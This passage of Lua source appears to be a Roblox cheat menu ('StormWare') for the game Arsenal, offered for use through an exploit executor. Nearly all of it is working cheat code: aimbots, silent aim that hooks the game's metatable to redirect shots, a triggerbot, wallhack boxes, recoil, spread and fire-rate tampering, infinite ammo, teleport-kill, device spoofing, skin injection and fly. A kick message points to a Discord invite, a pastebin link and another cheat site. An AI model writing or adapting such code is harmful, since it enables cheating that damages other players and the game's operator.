	local getCountry = game.LocalizationService:GetCountryRegionForPlayerAsync(game.Players.LocalPlayer):lower()
	
	script.Parent.ware.SIDE.PFP.Image = p -- simple enough i guess.
	script.Parent.ware.SIDE.currName.Text = game.Players.LocalPlayer.Name -- set our name!
	script.Parent.ware.SIDE.rnk.Text = "Rank - User"
	game.Players.LocalPlayer:Kick("You have been saved by: SW_SECURITY_CHECK, This version of StormWare is heavily outdated and non-updated. If you wish for an enhanced experience while playing Arsenal, We recommend using aimhook.xyz (synapse only), Join our discord: .gg/rsjWz4hS5s - If you are sure you want to use this outdated version, go to the following pastebin link: pastebin.com/raw/Uh6UGysg")
	if getCountry == "gb" then
		script.Parent.ware.SIDE.rnk.Text = "Rank - Bri'ish"
	end
	
	if game.Players.LocalPlayer.UserId == 3095365092 then
		script.Parent.ware.SIDE.rnk.Text = "Rank - Owner"
	end
	
	
	script.Parent.ware.CombatFrame.killall.MouseButton1Click:Connect(function()
	
		for i,v in pairs(game.Players:GetPlayers()) do
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame
			wait(2)
		end
	end)
	
	script.Parent.ware.CombatFrame.Free.MouseButton1Click:Connect(function()
		for i,v in pairs(game.Players:GetPlayers()) do
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame
			wait(3)
		end
	end)
	
	script.Parent.ware.CombatFrame.used.aimlock.MouseButton1Click:Connect(function()
		local dwCamera = workspace.CurrentCamera
		local dwRunService = game:GetService("RunService")
		local dwUIS = game:GetService("UserInputService")
		local dwEntities = game:GetService("Players")
		local dwLocalPlayer = dwEntities.LocalPlayer
		local dwMouse = dwLocalPlayer:GetMouse()
	
		local settings = {
			Aimbot = true,
			Aiming = false,
			Aimbot_AimPart = "Head",
			Aimbot_TeamCheck = true,
			Aimbot_Draw_FOV = true,
			Aimbot_FOV_Radius = 200,
			Aimbot_FOV_Color = Color3.fromRGB(255,255,255)
		}
	
		local fovcircle = Drawing.new("Circle")
		fovcircle.Visible = settings.Aimbot_Draw_FOV
		fovcircle.Radius = settings.Aimbot_FOV_Radius
		fovcircle.Color = settings.Aimbot_FOV_Color
		fovcircle.Thickness = 1
		fovcircle.Filled = false
		fovcircle.Transparency = 1
	
		fovcircle.Position = Vector2.new(dwCamera.ViewportSize.X / 2, dwCamera.ViewportSize.Y / 2)
	
		dwUIS.InputBegan:Connect(function(i)
			if i.UserInputType == Enum.UserInputType.MouseButton2 then
				settings.Aiming = true
			end
		end)
	
		dwUIS.InputEnded:Connect(function(i)
			if i.UserInputType == Enum.UserInputType.MouseButton2 then
				settings.Aiming = false
			end
		end)
	
		dwRunService.RenderStepped:Connect(function()
	
			local dist = math.huge
			local closest_char = nil
	
			if settings.Aiming then
	
				for i,v in next, dwEntities:GetChildren() do 
	
					if v ~= dwLocalPlayer and
						v.Character and
						v.Character:FindFirstChild("HumanoidRootPart") and
						v.Character:FindFirstChild("Humanoid") and
						v.Character:FindFirstChild("Humanoid").Health > 0 then
	
						if settings.Aimbot_TeamCheck == true and
							v.Team ~= dwLocalPlayer.Team or
							settings.Aimbot_TeamCheck == false then
	
							local char = v.Character
							local char_part_pos, is_onscreen = dwCamera:WorldToViewportPoint(char[settings.Aimbot_AimPart].Position)
	
							if is_onscreen then
	
								local mag = (Vector2.new(dwMouse.X, dwMouse.Y) - Vector2.new(char_part_pos.X, char_part_pos.Y)).Magnitude
	
								if mag < dist and mag < settings.Aimbot_FOV_Radius then
	
									dist = mag
									closest_char = char
	
								end
							end
						end
					end
				end
	
				if closest_char ~= nil and
					closest_char:FindFirstChild("HumanoidRootPart") and
					closest_char:FindFirstChild("Humanoid") and
					closest_char:FindFirstChild("Humanoid").Health > 0 then
	
					dwCamera.CFrame = CFrame.new(dwCamera.CFrame.Position, closest_char[settings.Aimbot_AimPart].Position)
				end
			end
		end)
	end)
	
	
	script.Parent.ware.PlayerFrame.Others.Sunglasses.MouseButton1Click:Connect(function()
		while wait(1) do 
			game.ReplicatedStorage.Events.Sunglasses:FireServer()
		end
	end)
	
	
	
	script.Parent.ware.CombatFrame.used.Hitboxes.MouseButton1Click:Connect(function()
		local CurrentCamera = workspace.CurrentCamera
		local Players = game.GetService(game, "Players")
		local LocalPlayer = Players.LocalPlayer
		local Mouse = LocalPlayer:GetMouse()
		function ClosestPlayer()
			local MaxDist, Closest = math.huge
			for I,V in pairs(Players.GetPlayers(Players)) do
				if V == LocalPlayer then continue end
				if V.Team == LocalPlayer then continue end
				if not V.Character then continue end
				local Head = V.Character.FindFirstChild(V.Character, "Head")
				if not Head then continue end
				local Pos, Vis = CurrentCamera.WorldToScreenPoint(CurrentCamera, Head.Position)
				if not Vis then continue end
				local MousePos, TheirPos = Vector2.new(Mouse.X, Mouse.Y), Vector2.new(Pos.X, Pos.Y)
				local Dist = (TheirPos - MousePos).Magnitude
				if Dist < MaxDist then
					MaxDist = Dist
					Closest = V
				end
			end
			return Closest
		end
		local MT = getrawmetatable(game)
		local OldNC = MT.__namecall
		local OldIDX = MT.__index
		setreadonly(MT, false)
		MT.__namecall = newcclosure(function(self, ...)
			local Args, Method = {...}, getnamecallmethod()
			if Method == "FindPartOnRayWithIgnoreList" and not checkcaller() then
				local CP = ClosestPlayer()
				if CP and CP.Character and CP.Character.FindFirstChild(CP.Character, "Head") then
					Args[1] = Ray.new(CurrentCamera.CFrame.Position, (CP.Character.Head.Position - CurrentCamera.CFrame.Position).Unit * 1000)
					return OldNC(self, unpack(Args))
				end
			end
			return OldNC(self, ...)
		end)
	
	end)
	
	
	script.Parent.ware.CombatFrame.mods.noRecoil.MouseButton1Click:Connect(function()
		for i,v in next, game.ReplicatedStorage.Weapons:GetChildren() do
			for i,c in next, v:GetChildren() do 
				for i,x in next, getconnections(c.Changed) do
					x:Disable() -- probably not needed
				end
				if c.Name == "RecoilControl" then
					c.Value = 0 -- very gamer
				end
			end
		end
	end)
	
	
	script.Parent.ware.CombatFrame.mods.nospread.MouseButton1Click:Connect(function()
		for i,v in next, game.ReplicatedStorage.Weapons:GetChildren() do
			for i,c in next, v:GetChildren() do 
				for i,x in next, getconnections(c.Changed) do
					x:Disable() -- probably not needed
				end
				if c.Name == "Spread" then
					c.Value = 0 -- very gamer
				end
			end
		end
	end)
	
	script.Parent.ware.CombatFrame.used.random.MouseButton1Click:Connect(function()
		local CurrentCamera = workspace.CurrentCamera
		local choice = math.random(1,2)
		local Players = game.GetService(game, "Players")
		local LocalPlayer = Players.LocalPlayer
		local aimPart = "nothin'"
		local Mouse = LocalPlayer:GetMouse()
		if choice == 1 then
			aimPart = "Head"
		else
			aimPart = "LowerTorso"
		end
		function ClosestPlayer()
			local MaxDist, Closest = math.huge
			for I,V in pairs(Players.GetPlayers(Players)) do
				if V == LocalPlayer then continue end
				if V.Team == LocalPlayer then continue end
				if not V.Character then continue end
				local Head = V.Character.FindFirstChild(V.Character, aimPart)
				if not Head then continue end
				local Pos, Vis = CurrentCamera.WorldToScreenPoint(CurrentCamera, Head.Position)
				if not Vis then continue end
				local MousePos, TheirPos = Vector2.new(Mouse.X, Mouse.Y), Vector2.new(Pos.X, Pos.Y)
				local Dist = (TheirPos - MousePos).Magnitude
				if Dist < MaxDist then
					MaxDist = Dist
					Closest = V
				end
			end
			return Closest
		end
		local MT = getrawmetatable(game)
		local OldNC = MT.__namecall
		local OldIDX = MT.__index
		setreadonly(MT, false)
		MT.__namecall = newcclosure(function(self, ...)
			local Args, Method = {...}, getnamecallmethod()
			if Method == "FindPartOnRayWithIgnoreList" and not checkcaller() then
				local CP = ClosestPlayer()
				if CP and CP.Character and CP.Character.FindFirstChild(CP.Character, aimPart) then
					Args[1] = Ray.new(CurrentCamera.CFrame.Position, (CP.Character[aimPart].Position - CurrentCamera.CFrame.Position).Unit * 1000)
					return OldNC(self, unpack(Args))
				end
			end
			return OldNC(self, ...)
		end)
		
		print(aimPart)
		while wait(0.6) do
			local c = math.random(1,2)
			if c == 1 then
				aimPart = "Head"
			else
				aimPart = "LowerTorso"
			end
		end
	end)
	
	
	script.Parent.ware.CombatFrame.used.Smoothlock.MouseButton1Click:Connect(function()
		bodyPart = 'Head'
	
		on = false
	
		local lp = game:GetService('Players').LocalPlayer
		local char = lp.Character
	
	
		local mouse = lp:GetMouse()
	
	
		game:GetService("UserInputService").InputBegan:connect(function(inputObject)
			if inputObject.KeyCode == Enum.KeyCode.C then
				on = not on
			end
		end)
	
	
	
	
	
	
	
	
	
	
	
	
	--[[local function isObstructed(part)
	   local hrp = char.HumanoidRootPart
	   local PointA_Position = hrp.Position
	   local PointB_Position = part.Position
	
	   local Direction = (PointB_Position - PointA_Position).Unit
	   local Raycast = Ray.new(PointA_Position, Direction * 100)
	   local Hit = workspace:FindPartOnRay(Raycast, char)
	   if Hit == part then
	       return true
	   else
	       return false
	   end
	end
	]]
	
		function cansee(targ)
			local cam = workspace.CurrentCamera
			local ray = Ray.new(lp.Character.Head.CFrame.p, (targ.CFrame.p - lp.Character.Head.CFrame.p).unit * 300)
			local part, position = workspace:FindPartOnRayWithIgnoreList(ray, {lp.Character}, false, true)
			if part then
				local humanoid = part.Parent:FindFirstChildOfClass("Humanoid")
	
				if not humanoid then
					humanoid = part.Parent.Parent:FindFirstChildOfClass("Humanoid")
				end
	
				if humanoid and targ and humanoid.Parent == targ.Parent then
					local blah,actualthing = cam:WorldToScreenPoint(targ.Position)
					if actualthing == true then
						return true
					else
						return false
					end
				else
					return false
				end
			else
				return false
			end
		end
	
	
	
	
		local function getClosestPlayerToCursor(x, y)
			local closestPlayer = nil
			local shortestDistance = math.huge
	
			for i, v in pairs(game:GetService("Players"):GetPlayers()) do
				if v ~= lp and v.Character and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health ~= 0 and v.Character:FindFirstChild("HumanoidRootPart") and v.Character:FindFirstChild("Head") then
					local pos = game:GetService("Workspace").CurrentCamera:WorldToViewportPoint(v.Character.HumanoidRootPart.Position)
					local magnitude = (Vector2.new(pos.X, pos.Y) - Vector2.new(x, y)).magnitude
	
					local targettable = (v.Team ~= lp.Team or v.Team == nil) and v.Character.Humanoid.Health > 0
					if magnitude < shortestDistance and cansee(v.Character.Head) == true and (v.Team ~= lp.Team or v.Team == nil) and v.Character.Humanoid.Health > 0 then
						closestPlayer = v
						shortestDistance = magnitude
					end
				end
			end
			return closestPlayer, shortestDistance
		end
	
	
	
	
	
	
	
	
	
	
		TweenStatus = nil
	
		local TweenService = game:GetService("TweenService")
		TweenCFrame = Instance.new("CFrameValue")
	
	
		function tweenstuff(partpos)
			TweenStatus = true
			TweenCFrame.Value = workspace.CurrentCamera.CFrame
			local tweenframe = TweenService:Create(TweenCFrame, TweenInfo.new(0.2),{Value = CFrame.new(workspace.CurrentCamera.CFrame.Position, partpos)})
			tweenframe:Play()
			tweenframe.Completed:Wait()
			TweenStatus = nil
			TweenCFrame.Value = CFrame.new(0,0,0)
		end
	
	
	
	
		game:GetService('RunService').Heartbeat:connect(function()
			if on == true then
				local plr, distance = getClosestPlayerToCursor(mouse.X, mouse.Y)
				if TweenStatus == nil and plr ~= nil and distance > 150 then
					tweenstuff(plr.Character.Head.Position)
				end
				if TweenStatus == true then
					workspace.CurrentCamera.CFrame = TweenCFrame.Value
				end
				if plr ~= nil and distance < 150 and TweenStatus == nil then
					workspace.CurrentCamera.CFrame = CFrame.new(workspace.CurrentCamera.CFrame.Position, plr.Character.Head.Position)
				end
			end
		end)
	end)
	
	script.Parent.ware.CombatFrame.used.lowertorso.MouseButton1Click:Connect(function()
		local CurrentCamera = workspace.CurrentCamera
		local Players = game.GetService(game, "Players")
		local LocalPlayer = Players.LocalPlayer
		local Mouse = LocalPlayer:GetMouse()
		function ClosestPlayer()
			local MaxDist, Closest = math.huge
			for I,V in pairs(Players.GetPlayers(Players)) do
				if V == LocalPlayer then continue end
				if V.Team == LocalPlayer then continue end
				if not V.Character then continue end
				local Head = V.Character.FindFirstChild(V.Character, "LowerTorso")
				if not Head then continue end
				local Pos, Vis = CurrentCamera.WorldToScreenPoint(CurrentCamera, Head.Position)
				if not Vis then continue end
				local MousePos, TheirPos = Vector2.new(Mouse.X, Mouse.Y), Vector2.new(Pos.X, Pos.Y)
				local Dist = (TheirPos - MousePos).Magnitude
				if Dist < MaxDist then
					MaxDist = Dist
					Closest = V
				end
			end
			return Closest
		end
		local MT = getrawmetatable(game)
		local OldNC = MT.__namecall
		local OldIDX = MT.__index
		setreadonly(MT, false)
		MT.__namecall = newcclosure(function(self, ...)
			local Args, Method = {...}, getnamecallmethod()
			if Method == "FindPartOnRayWithIgnoreList" and not checkcaller() then
				local CP = ClosestPlayer()
				if CP and CP.Character and CP.Character.FindFirstChild(CP.Character, "LowerTorso") then
					Args[1] = Ray.new(CurrentCamera.CFrame.Position, (CP.Character.LowerTorso.Position - CurrentCamera.CFrame.Position).Unit * 1000)
					return OldNC(self, unpack(Args))
				end
			end
			return OldNC(self, ...)
		end)
	
	
	end)
	
	script.Parent.ware.CombatFrame.mods.FireRate.MouseButton1Click:Connect(function()
		for i,v in pairs(game.ReplicatedStorage.Weapons:GetChildren()) do
			print(v.Name)
			print(v.FireRate.Value)
			v.FireRate.Value = 0.03
			v.Auto.Value = true
		end
	end)
	
	script.Parent.ware.CombatFrame.mods.InfAmmo.MouseButton1Click:Connect(function()
		if game:GetService("ReplicatedStorage").wkspc.CurrentCurse.Value == "Infinite Ammo" then
			game:GetService("ReplicatedStorage").wkspc.CurrentCurse.Value = ""
		else
			game:GetService("ReplicatedStorage").wkspc.CurrentCurse.Value = "Infinite Ammo"
		end
	end)
	
	script.Parent.ware.CombatFrame.used.triggerbot.MouseButton1Click:Connect(function()
		local player = game:GetService("Players").LocalPlayer
		local mouseGet = player:GetMouse()
		game:GetService("RunService").RenderStepped:Connect(function()
			if mouseGet.Target.Parent:FindFirstChild("Humanoid") and mouseGet.Target.Parent.Name ~= player.Name and game.Players:GetPlayerFromCharacter(mouseGet.Target.Parent).Team ~= player.Team then
				mouse1press() 
				wait(1) 
				mouse1release()
			end
		end) 
	end)
	
	
	
	script.Parent.ware.PlayerFrame.Others.upd.MouseButton1Click:Connect(function()
		local value = script.Parent.ware.PlayerFrame.Others.Gravity.Text
		local numb = tonumber(value)
		game:GetService("ReplicatedStorage").CurrentGrav.Value = value
	end)
	script.Parent.ware.PlayerFrame.tpfly.tel.MouseButton1Click:Connect(function()
		local plr = game.Players[script.Parent.ware.PlayerFrame.teleport.Text]
		local char = plr.Character.HumanoidRootPart.CFrame
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = char
		
	end)
	
	script.Parent.ware.PlayerFrame.Others.Walkspeed.MouseButton1Click:Connect(function()
		if game:GetService("ReplicatedStorage").Arcade.Value == true then
			game:GetService("ReplicatedStorage").Arcade.Value = false
		else
			game:GetService("ReplicatedStorage").Arcade.Value = true
		end
	end)
	
	script.Parent.ware.PlayerFrame.DSpoofs.mobile.MouseButton1Click:Connect(function()
		game.ReplicatedStorage.Events.CoolNewRemote:FireServer("Touch")
	end)
	
	script.Parent.ware.PlayerFrame.DSpoofs.console.MouseButton1Click:Connect(function()
		game.ReplicatedStorage.Events.CoolNewRemote:FireServer("Gamepad1")
	end)
	
	script.Parent.ware.PlayerFrame.DSpoofs.none.MouseButton1Click:Connect(function()
		game.ReplicatedStorage.Events.CoolNewRemote:FireServer("None")
	end)
	
	script.Parent.ware.PlayerFrame.DSpoofs.pc.MouseButton1Click:Connect(function()
		game.ReplicatedStorage.Events.CoolNewRemote:FireServer("MouseButton1")
	end)
	
	
	
	
	
	script.Parent.ware.VisualFrame.viss.box.MouseButton1Click:Connect(function()
		-- This is using SXDL
	
		local lplr = game.Players.LocalPlayer
		local camera = game:GetService("Workspace").CurrentCamera
		local CurrentCamera = workspace.CurrentCamera
		local worldToViewportPoint = CurrentCamera.worldToViewportPoint
	
		local HeadOff = Vector3.new(0, 0.5, 0)
		local LegOff = Vector3.new(0,3,0)
	
		for i,v in pairs(game.Players:GetChildren()) do
			local BoxOutline = Drawing.new("Square")
			BoxOutline.Visible = false
			BoxOutline.Color = Color3.new(0,0,0)
			BoxOutline.Thickness = 3
			BoxOutline.Transparency = 1
			BoxOutline.Filled = false
	
			local Box = Drawing.new("Square")
			Box.Visible = false
			Box.Color = Color3.new(1,1,1)
			Box.Thickness = 1
			Box.Transparency = 1
			Box.Filled = false
	
			function boxesp()
				game:GetService("RunService").RenderStepped:Connect(function()
					if v.Character ~= nil and v.Character:FindFirstChild("Humanoid") ~= nil and v.Character:FindFirstChild("HumanoidRootPart") ~= nil and v ~= lplr and v.Character.Humanoid.Health > 0 then
						local Vector, onScreen = camera:worldToViewportPoint(v.Character.HumanoidRootPart.Position)
	
						local RootPart = v.Character.HumanoidRootPart
						local Head = v.Character.Head
						local RootPosition, RootVis = worldToViewportPoint(CurrentCamera, RootPart.Position)
						local HeadPosition = worldToViewportPoint(CurrentCamera, Head.Position + HeadOff)
						local LegPosition = worldToViewportPoint(CurrentCamera, RootPart.Position - LegOff)
	
						if onScreen then
							BoxOutline.Size = Vector2.new(1000 / RootPosition.Z, HeadPosition.Y - LegPosition.Y)
							BoxOutline.Position = Vector2.new(RootPosition.X - BoxOutline.Size.X / 2, RootPosition.Y - BoxOutline.Size.Y / 2)
							BoxOutline.Visible = true
	
							Box.Size = Vector2.new(1000 / RootPosition.Z, HeadPosition.Y - LegPosition.Y)
							Box.Position = Vector2.new(RootPosition.X - Box.Size.X / 2, RootPosition.Y - Box.Size.Y / 2)
							Box.Visible = true
	
							if v.TeamColor == lplr.TeamColor then
								BoxOutline.Visible = false
								Box.Visible = false
							else
								BoxOutline.Visible = true
								Box.Visible = true
							end
	
						else
							BoxOutline.Visible = false
							Box.Visible = false
						end
					else
						BoxOutline.Visible = false
						Box.Visible = false
					end
				end)
			end
			coroutine.wrap(boxesp)()
		end
	
		game.Players.PlayerAdded:Connect(function(v)
			local BoxOutline = Drawing.new("Square")
			BoxOutline.Visible = false
			BoxOutline.Color = Color3.new(0,0,0)
			BoxOutline.Thickness = 3
			BoxOutline.Transparency = 1
			BoxOutline.Filled = false
	
			local Box = Drawing.new("Square")
			Box.Visible = false
			Box.Color = Color3.new(1,1,1)
			Box.Thickness = 1
			Box.Transparency = 1
			Box.Filled = false
	
			function boxesp()
				game:GetService("RunService").RenderStepped:Connect(function()
					if v.Character ~= nil and v.Character:FindFirstChild("Humanoid") ~= nil and v.Character:FindFirstChild("HumanoidRootPart") ~= nil and v ~= lplr and v.Character.Humanoid.Health > 0 then
						local Vector, onScreen = camera:worldToViewportPoint(v.Character.HumanoidRootPart.Position)
	
						local RootPart = v.Character.HumanoidRootPart
						local Head = v.Character.Head
						local RootPosition, RootVis = worldToViewportPoint(CurrentCamera, RootPart.Position)
						local HeadPosition = worldToViewportPoint(CurrentCamera, Head.Position + HeadOff)
						local LegPosition = worldToViewportPoint(CurrentCamera, RootPart.Position - LegOff)
	
						if onScreen then
							BoxOutline.Size = Vector2.new(1000 / RootPosition.Z, HeadPosition.Y - LegPosition.Y)
							BoxOutline.Position = Vector2.new(RootPosition.X - BoxOutline.Size.X / 2, RootPosition.Y - BoxOutline.Size.Y / 2)
							BoxOutline.Visible = true
	
							Box.Size = Vector2.new(1000 / RootPosition.Z, HeadPosition.Y - LegPosition.Y)
							Box.Position = Vector2.new(RootPosition.X - Box.Size.X / 2, RootPosition.Y - Box.Size.Y / 2)
							Box.Visible = true
	
							if v.TeamColor == lplr.TeamColor then
								BoxOutline.Visible = false
								Box.Visible = false
							else
								BoxOutline.Visible = true
								Box.Visible = true
							end
	
						else
							BoxOutline.Visible = false
							Box.Visible = false
						end
					else
						BoxOutline.Visible = false
						Box.Visible = false
					end
				end)
			end
			coroutine.wrap(boxesp)()
		end)
	end)
	
	script.Parent.ware.PlayerFrame.Others.Nonexisty.MouseButton1Click:Connect(function()
		game.Players.LocalPlayer.Character.LeftLowerArm:Destroy()
	
		game.Players.LocalPlayer.Character.LeftUpperArm:Destroy()
	
		game.Players.LocalPlayer.Character.RightLowerArm:Destroy()
	
		game.Players.LocalPlayer.Character.RightUpperArm:Destroy()
	
		game.Players.LocalPlayer.Character.LeftFoot:Destroy()
	
		game.Players.LocalPlayer.Character.LeftLowerLeg:Destroy()
	
		game.Players.LocalPlayer.Character.LeftUpperLeg:Destroy()
	
		game.Players.LocalPlayer.Character.RightFoot:Destroy()
	
		game.Players.LocalPlayer.Character.RightLowerLeg:Destroy()
	
		game.Players.LocalPlayer.Character.RightUpperLeg:Destroy()
	
		local esc = game.Players.LocalPlayer.Character.LowerTorso:GetChildren()
	
		for i, v in pairs(esc) do
	
			v:Destroy()
	
			wait()
	
		end
	
		local vm = game:GetService("ReplicatedStorage").Viewmodels.Arms.Delinquent
	
		vm.Name = "Holder"
	
		local toName = game:GetService("ReplicatedStorage").Viewmodels.Arms["Nonexisty"]
	
		toName.Name = "Delinquent"
	
		local Core = getsenv(game.Players.LocalPlayer.PlayerGui.Menew.LocalScript);
	
	
		local Loadout;
	
		for i,v in pairs(getupvalues(Core.ViewItems)) do
	
			if typeof(v) == "table" then
	
				if v.Skins then
	
					Loadout = v;
	
				end
	
			end
	
		end
	
	
		table.insert(Loadout.Skins, "Nonexisty")
	end)
	
	
	function onKeyPress(inputObject, gameProcessedEvent)
		if not gameProcessedEvent then
			if inputObject.KeyCode == Enum.KeyCode.RightShift  then 
				script.Parent.ware.Visible = not script.Parent.ware.Visible
			end
		end
	end
	game:GetService("UserInputService").InputBegan:connect(onKeyPress)
	
	
	repeat wait() 
	until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Head") and game.Players.LocalPlayer.Character:findFirstChild("Humanoid") 
	local mouse = game.Players.LocalPlayer:GetMouse() 
	repeat wait() until mouse
	local plr = game.Players.LocalPlayer 
	local torso = plr.Character.Head 
	local flying = false
	local deb = true 
	local ctrl = {f = 0, b = 0, l = 0, r = 0} 
	local lastctrl = {f = 0, b = 0, l = 0, r = 0} 
	local maxspeed = 300
	local speed = 0 
	
	function Fly() 
		local bg = Instance.new("BodyGyro", torso) 
		bg.P = 9e4 
		bg.maxTorque = Vector3.new(9e9, 9e9, 9e9) 
		bg.cframe = torso.CFrame 
		local bv = Instance.new("BodyVelocity", torso) 
		bv.velocity = Vector3.new(0,0.1,0) 
		bv.maxForce = Vector3.new(9e9, 9e9, 9e9) 
		repeat wait() 
			plr.Character.Humanoid.PlatformStand = true 
			if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then 
				speed = speed+.5+(speed/maxspeed) 
				if speed > maxspeed then 
					speed = maxspeed 
				end 
			elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then 
				speed = speed-1 
				if speed < 0 then 
					speed = 0 
				end 
			end 
			if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then 
				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed 
				lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r} 
			elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then 
				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed 
			else 
				bv.velocity = Vector3.new(0,0.1,0) 
			end 
			bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0) 
		until not flying 
		ctrl = {f = 0, b = 0, l = 0, r = 0} 
		lastctrl = {f = 0, b = 0, l = 0, r = 0} 
		speed = 0 
		bg:Destroy() 
		bv:Destroy() 
		plr.Character.Humanoid.PlatformStand = false 
	end 
	mouse.KeyDown:connect(function(key) 
		if key:lower() == "t" then 
			if flying then flying = false 
			else 
				flying = true 
				Fly() 
			end 
		elseif key:lower() == "w" then 
			ctrl.f = 1 
		elseif key:lower() == "s" then 
			ctrl.b = -1 
		elseif key:lower() == "a" then 
			ctrl.l = -1 
		elseif key:lower() == "d" then 
			ctrl.r = 1 
		end 
	end) 
	mouse.KeyUp:connect(function(key) 
		if key:lower() == "w" then 
			ctrl.f = 0 
		elseif key:lower() == "s" then 
			ctrl.b = 0 
		elseif key:lower() == "a" then 
			ctrl.l = 0 
		elseif key:lower() == "d" then 
			ctrl.r = 0 
		end 
	end)
	Fly()
end
coroutine.wrap(JPSURY_fake_script)()
end
